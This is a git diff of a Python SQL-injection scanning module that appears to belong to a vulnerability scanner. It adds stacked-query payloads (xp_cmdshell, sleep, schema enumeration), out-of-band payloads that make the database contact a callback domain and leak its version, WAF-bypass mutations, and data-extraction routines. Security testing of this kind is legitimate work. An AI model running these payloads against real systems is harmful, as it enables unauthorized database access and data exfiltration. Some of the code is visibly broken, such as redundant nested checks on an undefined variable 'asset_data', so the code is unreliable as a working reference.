                 test_params[param_name] = [original + f"' ORDER BY {mid}--"]
                 test_url = f"{base_url}?{urlencode(test_params, doseq=True)}"
                 
@@ -2194,6 +4281,266 @@ class SQLiScanner(ScanModule):
         
         return result
 
+    # =========================================================================
+    # STACKED QUERIES DETECTION (2026-02-12)
+    # Tests ability to execute multiple SQL statements via semicolon
+    # =========================================================================
+
+    # Stacked queries payloads - designed to trigger observable side effects
+    STACKED_PAYLOADS: list[tuple[str, str, str]] = [
+        # Time-based stacked (most reliable)
+        ("'; WAITFOR DELAY '0:0:{delay}'--", "mssql", "waitfor_delay"),
+        ("'; SELECT pg_sleep({delay})--", "postgresql", "pg_sleep"),
+        ("'; SELECT SLEEP({delay})--", "mysql", "sleep"),
+        # Error-based stacked
+        ("'; SELECT 1/0--", "generic", "div_zero"),
+        ("'; SELECT * FROM nonexistent_table_xyzzy--", "generic", "bad_table"),
+        ("'; EXEC xp_cmdshell 'ping 127.0.0.1'--", "mssql", "xp_cmdshell"),
+        # Version fingerprinting (confirms stacked execution)
+        ("'; SELECT @@version--", "mssql", "version_mssql"),
+        ("'; SELECT version()--", "postgresql", "version_pg"),
+        ("'; SELECT VERSION()--", "mysql", "version_mysql"),
+        # Database enumeration stacked
+        ("'; SELECT table_name FROM information_schema.tables LIMIT 1--", "generic", "info_schema"),
+    ]
+
+    async def _test_stacked_queries(
+        self,
+        base_url: str,
+        param_name: str,
+        params: dict[str, list[str]],
+        detector: AnomalyDetector,
+        ctx: InjectionContext,
+    ) -> SQLiEvidence | None:
+        """
+        Test stacked queries SQLi (multiple statements via semicolon).
+
+        Stacked queries allow executing arbitrary SQL statements and are
+        particularly dangerous as they can INSERT, UPDATE, DELETE data.
+        """
+        delay = self.time_delay
+
+        async with get_scan_client(timeout=delay + 15, http2=True) as client:
+            # Get baseline response
+            baseline_url = f"{base_url}?{urlencode(params, doseq=True)}"
+            try:
+                baseline_resp = await client.get(baseline_url, headers=self._auth_headers)
+                baseline_status = baseline_resp.status_code
+                baseline_text = baseline_resp.text.lower()
+                baseline_time = 0.5  # Assume fast baseline
+            except Exception as e:
+                logger.debug(f"[SQLi] Stacked baseline failed: {e}")
+                return None
+
+            for payload_template, db_type, name in self.STACKED_PAYLOADS:
+                payload = payload_template.format(delay=delay)
+
+                # Apply WAF bypass mutations with WAFBypassEngine (2026-02-20)
+                mutations = self._get_payload_mutations(payload, ctx.detected_waf)
+
+                for mutated_payload in mutations[:4]:  # Limit mutations
+                    test_params = params.copy()
+                    original = (test_params.get(param_name) or [""])[0]
+                    test_params[param_name] = [original + mutated_payload]
+                    test_url = f"{base_url}?{urlencode(test_params, doseq=True)}"
+
+                    try:
+                        await self._rate_limiter.acquire(self._host)
+                        start = time.time()
+                        response = await client.get(test_url, headers=self._auth_headers)
+                        elapsed = time.time() - start
+                        resp_text = response.text.lower()
+
+                        is_vulnerable = False
+                        detection_type = ""
+
+                        # 1. Time-based detection (most reliable for stacked)
+                        if "delay" in payload_template or "sleep" in payload_template.lower():
+                            is_anomaly, z_score = detector.is_time_anomaly(elapsed)
+                            if elapsed >= delay - 1 and is_anomaly and z_score > 2:
+                                is_vulnerable = True
+                                detection_type = "time_delay"
+
+                        # 2. Error-based detection (for div_zero, bad_table)
+                        if not is_vulnerable:
+                            error_indicators = [
+                                "division by zero", "divide by zero",
+                                "does not exist", "doesn't exist",
+                                "unknown table", "no such table",
+                                "relation.*does not exist",
+                                "invalid object name",
+                            ]
+                            for indicator in error_indicators:
+                                if indicator in resp_text and indicator not in baseline_text:
+                                    is_vulnerable = True
+                                    detection_type = "error_triggered"
+                                    break
+
+                        # 3. Server error detection
+                        if not is_vulnerable and response.status_code == 500 and baseline_status != 500:
+                            is_vulnerable = True
+                            detection_type = "server_error"
+
+                        # 4. Version/info extraction (proves execution)
+                        if not is_vulnerable:
+                            version_patterns = [
+                                r"microsoft sql server.*\d+\.\d+",
+                                r"postgresql \d+\.\d+",
+                                r"\d+\.\d+\.\d+-.*mysql",
+                                r"mariadb",
+                            ]
+                            for pattern in version_patterns:
+                                if re.search(pattern, resp_text, re.I) and not re.search(pattern, baseline_text, re.I):
+                                    is_vulnerable = True
+                                    detection_type = "version_leak"
+                                    break
+
+                        if is_vulnerable:
+                            evidence = SQLiEvidence(
+                                detection_method=DetectionMethod.STACKED_QUERIES,
+                                payload=payload,
+                                mutated_payloads=[mutated_payload] if mutated_payload != payload else [],
+                                waf_bypassed=mutated_payload != payload,
+                            )
+                            # Try to identify database type
+                            try:
+                                evidence.db_type = DatabaseType[db_type.upper()]
+                            except KeyError:
+                                evidence.db_type = DatabaseType.UNKNOWN
+
+                            if detection_type == "time_delay":
+                                evidence.time_delays = [elapsed]
+
+                            logger.info(f"[SQLi] Stacked queries detected ({detection_type}): {param_name}")
+                            return evidence
+
+                    except httpx.TimeoutException:
+                        # Timeout can indicate successful time-based stacked
+                        if "delay" in payload_template or "sleep" in payload_template.lower():
+                            evidence = SQLiEvidence(
+                                detection_method=DetectionMethod.STACKED_QUERIES,
+                                payload=payload,
+                                time_delays=[delay + 15],
+                            )
+                            try:
+                                evidence.db_type = DatabaseType[db_type.upper()]
+                            except KeyError:
+                                evidence.db_type = DatabaseType.UNKNOWN
+                            logger.info(f"[SQLi] Stacked queries detected (timeout): {param_name}")
+                            return evidence
+
+                    except Exception as e:
+                        logger.debug(f"[SQLi] Stacked test error: {e}")
+                        continue
+
+        return None
+
+    # =========================================================================
+    # OUT-OF-BAND (OOB) SQLi DETECTION (2026-02-12)
+    # Uses DNS/HTTP callbacks to detect blind SQLi in Oracle, MSSQL, MySQL, PG
+    # =========================================================================
+
+    async def _test_oob_sqli(
+        self,
+        base_url: str,
+        param_name: str,
+        params: dict[str, list[str]],
+        ctx: InjectionContext,
+    ) -> SQLiEvidence | None:
+        """
+        Test Out-of-Band SQL injection using DNS/HTTP callbacks.
+
+        OOB SQLi is used when:
+        - No error messages are returned
+        - Time-based blind is blocked/filtered
+        - Need to exfiltrate data directly
+
+        Requires OOB engine to be configured with callback domain.
+        """
+        if not self._oob_engine or not _OOB_AVAILABLE:
+            return None
+
+        try:
+            # Generate OOB payloads for SQLi
+            oob_generator = OOBPayloadGenerator(
+                callback_host=getattr(self._oob_engine, 'callback_host', '127.0.0.1:8888'),
+                callback_domain=getattr(self._oob_engine, 'callback_domain', 'oob.local'),
+            )
+
+            # OOB SQLi payloads by database type
+            oob_sqli_payloads = [
+                # Oracle
+                ("' || UTL_HTTP.REQUEST('http://{callback}/{token}') || '", "oracle", "utl_http"),
+                ("' || (SELECT UTL_INADDR.GET_HOST_ADDRESS('{token}.{domain}') FROM DUAL) || '", "oracle", "utl_inaddr"),
+                # MSSQL
+                ("'; EXEC master..xp_dirtree '//{token}.{domain}/a'--", "mssql", "xp_dirtree"),
+                ("'; DECLARE @q varchar(1024); SET @q='\\\\{token}.{domain}\\a'; EXEC master..xp_dirtree @q--", "mssql", "xp_dirtree_var"),
+                # PostgreSQL
+                ("'; COPY (SELECT '{token}') TO PROGRAM 'nslookup {token}.{domain}'--", "postgresql", "copy_program"),
+                # MySQL
+                ("' UNION SELECT LOAD_FILE(CONCAT('//{token}.{domain}/',VERSION()))--", "mysql", "load_file"),
+            ]
+
+            callback_domain = getattr(self._oob_engine, 'callback_domain', 'oob.local')
+            callback_host = getattr(self._oob_engine, 'callback_host', '127.0.0.1:8888')
+
+            async with get_scan_client(timeout=15, http2=True) as client:
+                for payload_template, db_type, method_name in oob_sqli_payloads:
+                    # Generate unique token for this test
+                    token = oob_generator.generate_token()
+
+                    # Build payload with token
+                    payload = payload_template.format(
+                        token=token,
+                        domain=callback_domain,
+                        callback=callback_host,
+                    )
+
+                    # Apply WAF mutations with WAFBypassEngine (2026-02-20)
+                    mutations = self._get_payload_mutations(payload, ctx.detected_waf)
+
+                    for mutated_payload in mutations[:2]:  # Limit mutations for OOB
+                        test_params = params.copy()
+                        original = (test_params.get(param_name) or [""])[0]
+                        test_params[param_name] = [original + mutated_payload]
+                        test_url = f"{base_url}?{urlencode(test_params, doseq=True)}"
+
+                        try:
+                            await self._rate_limiter.acquire(self._host)
+
+                            # Send the payload
+                            await client.get(test_url, headers=self._auth_headers)
+
+                            # Wait a moment for callback
+                            await asyncio.sleep(2)
+
+                            # Check if callback was received
+                            if hasattr(self._oob_engine, 'check_callback'):
+                                callback_result = await self._oob_engine.check_callback(token)
+                                if callback_result:
+                                    evidence = SQLiEvidence(
+                                        detection_method=DetectionMethod.OUT_OF_BAND,
+                                        payload=payload,
+                                        mutated_payloads=[mutated_payload] if mutated_payload != payload else [],
+                                        waf_bypassed=mutated_payload != payload,
+                                    )
+                                    try:
+                                        evidence.db_type = DatabaseType[db_type.upper()]
+                                    except KeyError:
+                                        evidence.db_type = DatabaseType.UNKNOWN
+
+                                    logger.info(f"[SQLi] OOB SQLi detected ({db_type}, {method_name}): {param_name}")
+                                    return evidence
+
+                        except Exception as e:
+                            logger.debug(f"[SQLi] OOB test error: {e}")
+                            continue
+
+        except Exception as e:
+            logger.debug(f"[SQLi] OOB setup error: {e}")
+
+        return None
+
     # =============================================================================
     # DATA EXTRACTION METHODS (Real exploitation proof)
     # =============================================================================
@@ -2211,7 +4558,7 @@ class SQLiScanner(ScanModule):
         if num_columns == 0:
             return extracted
 
-        async with httpx.AsyncClient(timeout=self.timeout, verify=False, http2=True) as client:
+        async with get_scan_client(timeout=self.timeout, http2=True) as client:
             # Step 1: Find displayable column (replace NULLs with marker one at a time)
             marker = f"PHANTOM_{random.randint(100000, 999999)}"
             display_col = -1
@@ -2224,7 +4571,7 @@ class SQLiScanner(ScanModule):
                 payload = f"' UNION SELECT {cols_str}--"
 
                 test_params = params.copy()
-                original = test_params[param_name][0] if test_params[param_name] else ""
+                original = (test_params.get(param_name) or [""])[0]
                 test_params[param_name] = [original + payload]
                 test_url = f"{base_url}?{urlencode(test_params, doseq=True)}"
 
@@ -2248,7 +4595,7 @@ class SQLiScanner(ScanModule):
                 cols_str = ",".join(test_cols)
                 payload = f"' UNION SELECT {cols_str}--"
                 test_params = params.copy()
-                original = test_params[param_name][0] if test_params[param_name] else ""
+                original = (test_params.get(param_name) or [""])[0]
                 test_params[param_name] = [original + payload]
                 test_url = f"{base_url}?{urlencode(test_params, doseq=True)}"
                 try:
@@ -2330,7 +4677,7 @@ class SQLiScanner(ScanModule):
                 payload = f"' UNION SELECT {cols_str} {from_clause}"
 
                 test_params = params.copy()
-                original = test_params[param_name][0] if test_params[param_name] else ""
+                original = (test_params.get(param_name) or [""])[0]
                 test_params[param_name] = [original + payload]
                 test_url = f"{base_url}?{urlencode(test_params, doseq=True)}"
 
@@ -2388,8 +4735,8 @@ class SQLiScanner(ScanModule):
                                 extracted["sample_data"] = raw.split("||")[:5]
                                 extracted["sample_table"] = target_table
                                 logger.info(f"[SQLi] Extracted {len(extracted['sample_data'])} sample rows from {target_table}")
-                    except Exception:
-                        pass
+                    except (ValueError, IndexError) as e:
+                        logger.debug(f"[SQLi] Data extraction marker parsing failed: {e}")
 
         return extracted
 
@@ -2412,7 +4759,7 @@ class SQLiScanner(ScanModule):
         }
         version_func = version_funcs.get(db, "@@version")
 
-        async with httpx.AsyncClient(timeout=self.timeout, verify=False, http2=True) as client:
+        async with get_scan_client(timeout=self.timeout, http2=True) as client:
             # Extract version string char-by-char using binary search
             version_str = ""
             max_chars = 30  # Limit extraction to 30 chars for speed
@@ -2428,7 +4775,7 @@ class SQLiScanner(ScanModule):
                     payload_gt = f"' AND ASCII(SUBSTRING({version_func},{pos},1))>{mid}--"
 
                     test_params = params.copy()
-                    original = test_params[param_name][0] if test_params[param_name] else ""
+                    original = (test_params.get(param_name) or [""])[0]
                     test_params[param_name] = [original + payload_gt]
                     test_url = f"{base_url}?{urlencode(test_params, doseq=True)}"
 
@@ -2483,7 +4830,7 @@ class SQLiScanner(ScanModule):
         extracted: dict[str, Any] = {}
         db = evidence.db_type
 
-        async with httpx.AsyncClient(timeout=self.timeout, verify=False, http2=True) as client:
+        async with get_scan_client(timeout=self.timeout, http2=True) as client:
             # DB-specific error-based extraction payloads
             error_extract_payloads = []
             if db == DatabaseType.MYSQL:
@@ -2514,7 +4861,7 @@ class SQLiScanner(ScanModule):
 
             for data_type, payload in error_extract_payloads:
                 test_params = params.copy()
-                original = test_params[param_name][0] if test_params[param_name] else ""
+                original = (test_params.get(param_name) or [""])[0]
                 test_params[param_name] = [original + payload]
                 test_url = f"{base_url}?{urlencode(test_params, doseq=True)}"
 
@@ -2607,74 +4954,264 @@ class SQLiScanner(ScanModule):
         host: str,
         form: dict[str, Any],
     ) -> list[dict[str, Any]]:
-        """Test form with God Mode precision."""
+        """Test form with God Mode precision.
+
+        2026-02-20: Now uses FormContextPreserver to maintain valid values
+        in non-target fields during injection testing. This prevents false
+        negatives caused by server-side validation rejecting empty fields.
+
+        Example problem solved:
+        - Form has username, password fields
+        - Testing SQLi in username with password="" → "Password required" error
+        - Now: password="Test1234!" while testing username
+        """
         findings = []
-        
+
         action = form.get("action", "")
         method = form.get("method", "GET").upper()
         inputs = form.get("inputs", [])
-        
+
         if not action.startswith("http"):
             base_url = host if host.startswith("http") else f"https://{host}"
             action = f"{base_url}{action}" if action.startswith("/") else f"{base_url}/{action}"
-        
-        form_data = {inp.get("name", ""): inp.get("value", "") for inp in inputs if inp.get("name")}
-        
-        # Get baseline
+
+        # 2026-02-20: Convert dict-based form to FormDefinition for context preservation
+        form_def = self._build_form_definition(action, method, inputs)
+        preserver = FormContextPreserver()
+
+        # Build initial form_data with valid placeholder values (not empty)
+        # This replaces the old empty-value approach that caused validation failures
+        form_data = {}
+        for field_def in form_def.fields:
+            form_data[field_def.name] = preserver._get_valid_value(field_def, form_def)
+
+        # Get baseline with valid values (more likely to succeed)
         cluster, detector = await self._get_baseline_cluster(
             action,
             method=method,
             data=form_data if method == "POST" else None,
             params=form_data if method == "GET" else None,
         )
-        
+
         if not cluster.fingerprints:
+            # FN-C6 FIX: Log and try simple error-based detection
+            logger.info(f"[SQLi] Form baseline failed for {action}, trying error-based detection only")
+            findings.extend(await self._test_simple_form_error_based(action, method, form_def, inputs, preserver))
             return findings
-        
+
         waf_type = await self._detect_waf(action)
-        
-        for input_field in inputs:
-            field_name = input_field.get("name")
-            if not field_name:
-                continue
-            
+
+        for field_def in form_def.get_injectable_fields():
+            field_name = field_def.name
+
             ctx = InjectionContext(
                 param_name=field_name,
                 param_type="body" if method == "POST" else "query",
-                original_value=input_field.get("value", ""),
+                original_value=field_def.default_value or "",
                 endpoint=action,
                 method=method,
                 detected_waf=waf_type,
             )
-            
+
             if ctx.is_email():
                 continue
-            
-            # Simplified form testing (error-based focus)
+
+            # 2026-02-20: Pass FormContextPreserver to maintain valid values
             result = await self._test_form_error_based(
-                action, field_name, form_data, method, cluster, ctx
+                action, field_name, form_def, method, cluster, ctx, preserver
             )
-            
+
             if result and result.is_vulnerable and result.confidence >= self.MIN_CONFIDENCE:
                 findings.append(self._create_finding(result))
-        
+
         return findings
-    
+
+    def _build_form_definition(
+        self,
+        action: str,
+        method: str,
+        inputs: list[dict[str, Any]],
+    ) -> FormDefinition:
+        """Convert crawler's dict-based form to FormDefinition for context preservation.
+
+        2026-02-20: Helper for FormContextPreserver integration.
+        """
+        from scanning.form_context_preserver import FieldDefinition
+
+        fields = []
+        for inp in inputs:
+            name = inp.get("name", "")
+            if not name:
+                continue
+
+            input_type = inp.get("type", "text").lower()
+            value = inp.get("value", "")
+
+            # Detect field type from name and input type
+            field_type = self._detect_field_type_for_preserver(name, input_type)
+
+            # Check if CSRF token
+            is_csrf = any(ind in name.lower() for ind in [
+                "csrf", "token", "_token", "user_token", "nonce", "authenticity"
+            ])
+
+            fields.append(FieldDefinition(
+                name=name,
+                field_type=field_type,
+                is_required=inp.get("required", False),
+                default_value=value if value else None,
+                is_injectable=not is_csrf and input_type not in ["hidden", "submit", "button"],
+                is_csrf=is_csrf,
+            ))
+
+        return FormDefinition(
+            action=action,
+            method=method,
+            fields=fields,
+            discovered_from=action,
+        )
+
+    def _detect_field_type_for_preserver(self, name: str, input_type: str) -> "FieldType":
+        """Detect FieldType from field name and HTML input type."""
+        from scanning.form_context_preserver import FieldType
+
+        name_lower = name.lower()
+
+        # HTML5 type mappings
+        type_map = {
+            "email": FieldType.EMAIL,
+            "password": FieldType.PASSWORD,
+            "tel": FieldType.PHONE,
+            "url": FieldType.URL,
+            "number": FieldType.NUMBER,
+            "date": FieldType.DATE,
+            "hidden": FieldType.HIDDEN,
+        }
+        if input_type in type_map:
+            return type_map[input_type]
+
+        # Name-based detection
+        if any(p in name_lower for p in ["email", "e-mail", "mail"]):
+            return FieldType.EMAIL
+        if any(p in name_lower for p in ["password", "passwd", "pwd", "pass"]):
+            return FieldType.PASSWORD
+        if any(p in name_lower for p in ["phone", "tel", "mobile"]):
+            return FieldType.PHONE
+        if any(p in name_lower for p in ["username", "user", "login"]):
+            return FieldType.USERNAME
+        if any(p in name_lower for p in ["csrf", "token", "_token", "nonce"]):
+            return FieldType.CSRF
+        if any(p in name_lower for p in ["amount", "price", "total"]):
+            return FieldType.AMOUNT
+        if any(p in name_lower for p in ["quantity", "qty"]):
+            return FieldType.QUANTITY
+        if name_lower.endswith("_id") or name_lower == "id":
+            return FieldType.ID
+
+        return FieldType.TEXT
+
+    async def _test_simple_form_error_based(
+        self,
+        action: str,
+        method: str,
+        form_def: FormDefinition,
+        inputs: list[dict],
+        preserver: FormContextPreserver,
+    ) -> list[dict]:
+        """FN-C6 FIX: Simple error-based form SQLi when baseline fails.
+
+        2026-02-20: Now uses FormContextPreserver to maintain valid values
+        in non-target fields during testing.
+        """
+        findings = []
+
+        simple_payloads = [
+            ("'", "single_quote"),
+            ('"', "double_quote"),
+            ("'--", "comment"),
+            ("1 OR 1=1--", "or_bypass"),
+        ]
+
+        async with get_scan_client(timeout=self.timeout, http2=True) as client:
+            for field_def in form_def.get_injectable_fields():
+                field_name = field_def.name
+
+                for payload, payload_name in simple_payloads:
+                    # 2026-02-20: Use FormContextPreserver to get test data
+                    # with valid values in non-target fields
+                    test_data = preserver.get_test_data(
+                        form=form_def,
+                        target_field=field_name,
+                        injection_payload=payload,
+                    )
+
+                    try:
+                        await self._rate_limiter.acquire(self._host)
+                        if method == "POST":
+                            response = await client.post(action, data=test_data)
+                        else:
+                            response = await client.get(action, params=test_data)
+
+                        db_type, error_conf, pattern = DatabaseFingerprinter.detect(response.text)
+
+                        if db_type != DatabaseType.UNKNOWN and error_conf >= 70:
+                            logger.info(f"[SQLi] Form error-based (no baseline): {field_name} -> {db_type}")
+                            findings.append(Finding(
+                                vuln_type=FindingVulnType.SQLI,
+                                category=VulnCategory.INJECTION,
+                                name=f"SQL Injection in Form Field '{field_name}'",
+                                severity=Severity.HIGH,
+                                description=f"Database error detected in form field with payload: {payload}",
+                                host=urlparse(action).netloc,
+                                endpoint=action,
+                                evidence=[
+                                    f"Field: {field_name}",
+                                    f"Method: {method}",
+                                    f"Payload: {payload}",
+                                    f"Database: {db_type.value}",
+                                    "Note: Detected without baseline (fallback mode)",
+                                ],
+                                confidence_score=70.0,
+                                cvss_score=8.6,
+                                cwe_id="CWE-89",
+                                remediation="Use parameterized queries for form inputs.",
+                            ).to_dict())
+                            break
+
+                    except Exception as e:
+                        logger.debug(f"Simple form error test failed: {e}")
+                        continue
+
+        return findings
+
     async def _test_form_error_based(
         self,
         action: str,
         field_name: str,
-        form_data: dict[str, str],
+        form_def: FormDefinition,
         method: str,
         cluster: ResponseCluster,
         ctx: InjectionContext,
+        preserver: FormContextPreserver,
     ) -> SQLiResult | None:
-        """Test form field for error-based SQLi."""
-        
-        async with httpx.AsyncClient(timeout=self.timeout, verify=False, http2=True) as client:
-            for payload, name, conf in self.ERROR_PAYLOADS[:10]:
-                test_data = form_data.copy()
-                test_data[field_name] = payload
+        """Test form field for error-based SQLi.
+
+        2026-02-20: Now uses FormContextPreserver to maintain valid values
+        in non-target fields during testing.
+        """
+
+        async with get_scan_client(timeout=self.timeout, http2=True) as client:
+            # THEME-1 FIX: Test more error payloads for thorough form field coverage
+            # 2026-02-20: Now uses centralized PayloadLibrary with fallback to hardcoded
+            error_payloads = self._get_library_error_payloads(max_payloads=self.max_error_payloads)
+            for payload, name, conf in error_payloads:
+                # 2026-02-20: Use FormContextPreserver to get test data
+                # with valid values in non-target fields
+                test_data = preserver.get_test_data(
+                    form=form_def,
+                    target_field=field_name,
+                    injection_payload=payload,
+                )
                 
                 try:
                     if method == "POST":
@@ -2699,7 +5236,7 @@ class SQLiScanner(ScanModule):
                         
                         return SQLiResult(
                             is_vulnerable=True,
-                            confidence=evidence.total_confidence(),
+                            confidence_score=evidence.total_confidence(),
                             evidence=evidence,
                             context=ctx,
                         )
@@ -2712,17 +5249,23 @@ class SQLiScanner(ScanModule):
     async def _test_headers_godmode(self, host: str) -> list[dict[str, Any]]:
         """Test headers with God Mode precision."""
         findings = []
-        base_url = f"https://{host}" if not host.startswith("http") else host
-        
+        base_url = resolve_base_url(host)
+
+        # FN-C6 FIX: Header testing is error-based, doesn't strictly need baseline
+        # Just verify the endpoint is reachable
         cluster, _ = await self._get_baseline_cluster(base_url)
         if not cluster.fingerprints:
-            return findings
-        
-        async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
-            for header_name in self.INJECTABLE_HEADERS[:8]:
-                for payload, name, conf in self.ERROR_PAYLOADS[:5]:
+            logger.debug(f"[SQLi] No baseline for headers at {base_url}, continuing anyway")
+            # Header testing is error-based and doesn't require baseline comparison
+
+        async with get_scan_client(timeout=self.timeout) as client:
+            # THEME-1 FIX: Test more headers and payloads for thorough header injection coverage
+            # 2026-02-20: Now uses centralized PayloadLibrary with fallback to hardcoded
+            header_error_payloads = self._get_library_error_payloads(max_payloads=self.max_header_error_payloads)
+            for header_name in self.INJECTABLE_HEADERS[:self.max_injectable_headers]:
+                for payload, name, conf in header_error_payloads:
                     headers = {header_name: payload}
-                    
+
                     try:
                         response = await client.get(base_url, headers=headers)
                         
@@ -2750,24 +5293,24 @@ class SQLiScanner(ScanModule):
                             
                             result = SQLiResult(
                                 is_vulnerable=True,
-                                confidence=evidence.total_confidence(),
+                                confidence_score=evidence.total_confidence(),
                                 evidence=evidence,
                                 context=ctx,
                             )
                             
                             if result.confidence >= self.MIN_CONFIDENCE:
                                 findings.append(self._create_finding(result))
-                                return findings
-                                
+                                # P1-FIX 2026-02-11: Don't return - continue testing other headers
+
                     except Exception as e:
                         logger.debug(f"Header test failed: {e}")
-        
+
         return findings
-    
+
     async def _test_cookies_godmode(self, host: str) -> list[dict[str, Any]]:
         """Test cookies with God Mode precision."""
         findings = []
-        base_url = f"https://{host}" if not host.startswith("http") else host
+        base_url = resolve_base_url(host)
         
         test_cookies = [
             {"session": "' OR '1'='1"},
@@ -2775,7 +5318,7 @@ class SQLiScanner(ScanModule):
             {"auth_token": "admin'--"},
         ]
         
-        async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
+        async with get_scan_client(timeout=self.timeout) as client:
             for cookie_dict in test_cookies:
                 try:
                     response = await client.get(base_url, cookies=cookie_dict)
@@ -2804,25 +5347,25 @@ class SQLiScanner(ScanModule):
                         
                         result = SQLiResult(
                             is_vulnerable=True,
-                            confidence=evidence.total_confidence(),
+                            confidence_score=evidence.total_confidence(),
                             evidence=evidence,
                             context=ctx,
                         )
                         
                         if result.confidence >= self.MIN_CONFIDENCE:
                             findings.append(self._create_finding(result))
-                            return findings
-                            
+                            # P1-FIX 2026-02-11: Don't return - continue testing other cookies
+
                 except Exception as e:
                     logger.debug(f"Cookie test failed: {e}")
-        
+
         return findings
-    
+
     async def _test_graphql_godmode(self, endpoint: str) -> list[dict[str, Any]]:
         """Test GraphQL endpoint for SQLi."""
         findings = []
         
-        async with httpx.AsyncClient(timeout=self.timeout, verify=False) as client:
+        async with get_scan_client(timeout=self.timeout) as client:
             for payload in self.GRAPHQL_PAYLOADS:
                 try:
                     response = await client.post(
@@ -2856,20 +5399,20 @@ class SQLiScanner(ScanModule):
                         
                         result = SQLiResult(
                             is_vulnerable=True,
-                            confidence=evidence.total_confidence(),
+                            confidence_score=evidence.total_confidence(),
                             evidence=evidence,
                             context=ctx,
                         )
                         
                         if result.confidence >= self.MIN_CONFIDENCE:
                             findings.append(self._create_finding(result))
-                            return findings
-                            
+                            # P1-FIX 2026-02-11: Don't return - continue testing other GraphQL payloads
+
                 except Exception as e:
                     logger.debug(f"GraphQL test failed: {e}")
-        
+
         return findings
-    
+
     def _create_finding(self, result: SQLiResult) -> dict[str, Any]:
         """Create Finding from SQLiResult with detailed POC."""
         evidence = result.evidence
@@ -2923,12 +5466,18 @@ class SQLiScanner(ScanModule):
         # Use real extracted data if available, otherwise indicate detection-only
         real_extracted = []
         if evidence.extracted_data:
-            if evidence.extracted_data.get("tables"):
-                real_extracted = evidence.extracted_data["tables"][:10]
-            if evidence.extracted_data.get("db_version"):
-                real_extracted.insert(0, f"DB version: {evidence.extracted_data['db_version']}")
-            if evidence.extracted_data.get("current_db"):
-                real_extracted.insert(0, f"Database: {evidence.extracted_data['current_db']}")
+            if isinstance(asset_data, dict):
+                if evidence.extracted_data.get("tables"):
+                    if isinstance(asset_data, dict):
+                        real_extracted = evidence.extracted_data["tables"][:10]
+            if isinstance(asset_data, dict):
+                if evidence.extracted_data.get("db_version"):
+                    if isinstance(asset_data, dict):
+                        real_extracted.insert(0, f"DB version: {evidence.extracted_data['db_version']}")
+            if isinstance(asset_data, dict):
+                if evidence.extracted_data.get("current_db"):
+                    if isinstance(asset_data, dict):
+                        real_extracted.insert(0, f"Database: {evidence.extracted_data['current_db']}")
         if not real_extracted:
             real_extracted = ["(detection only — extraction not attempted or target did not respond)"]
 
@@ -2944,15 +5493,16 @@ class SQLiScanner(ScanModule):
         )
 
         finding = Finding(
-            type="sql_injection",
+            vuln_type=FindingVulnType.SQLI,
+            category=VulnCategory.INJECTION,
             name=name,
-            severity="CRITICAL",
+            severity=Severity.CRITICAL,
             description=description,
             host=ctx.endpoint,
-            matched_at=f"{ctx.endpoint} ({ctx.param_type}: {ctx.param_name})",
+            endpoint=f"{ctx.endpoint} ({ctx.param_type}: {ctx.param_name})",
             evidence=evidence.to_evidence_list(),
             cvss_score=9.8,
-            cwe="CWE-89",
+            cwe_id="CWE-89",
             remediation=(
                 "Use parameterized queries (prepared statements) instead of string concatenation. "
                 "Implement proper input validation and sanitization. "
@@ -2965,7 +5515,7 @@ class SQLiScanner(ScanModule):
                 "https://portswigger.net/web-security/sql-injection",
                 "https://cwe.mitre.org/data/definitions/89.html",
             ],
-            confidence=result.confidence,
+            confidence_score=result.confidence,
             metadata={
                 "poc": poc.to_dict(),
                 "detection_method": method_name,
@@ -2976,6 +5526,17 @@ class SQLiScanner(ScanModule):
                 "cross_validations": evidence.cross_validations,
                 "extracted_data": evidence.extracted_data if evidence.extracted_data else None,
             },
+        )
+
+        # SECOND-ORDER (2026-02-20): Record input for cross-endpoint detection
+        # Even though this finding was confirmed, the payload may also execute
+        # at other locations (admin panels, reports, logs, etc.)
+        self._record_second_order_input(
+            endpoint=ctx.endpoint,
+            param_name=ctx.param_name,
+            payload=working_payload,
+            response_status=200,  # Assume successful submission since finding was created
+            response_contains_marker=False,  # Will be checked during render location scan
         )
 
         return finding.to_dict()
